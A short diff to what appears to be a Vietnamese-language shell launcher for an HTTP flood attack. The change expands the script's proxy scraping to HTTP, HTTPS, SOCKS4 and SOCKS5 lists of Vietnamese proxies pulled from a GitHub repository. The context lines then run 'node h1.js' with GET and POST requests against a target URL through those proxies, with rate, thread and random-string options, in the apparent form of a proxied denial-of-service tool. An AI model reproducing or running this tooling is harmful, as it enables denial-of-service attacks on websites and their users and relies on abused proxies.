@@ -16,7 +16,7 @@ tong=0
 export NODE_OPTIONS=--max-old-space-size=8192
 
 # Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5
-for loai in http; do 
+for loai in http https socks4 socks5; do 
   lien_ket="https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$loai/Vietnam.txt"
   so_luong=$(curl -s "$lien_ket" | tee -a "$tep_tam" | wc -l)
   echo "$loai: $so_luong proxy"
@@ -38,7 +38,6 @@ done
 for method in GET POST; do 
   node h1.js "$method" "$URL" live.txt "$TIME" 128 4 randomstring=true &
 done
-
 
 
 
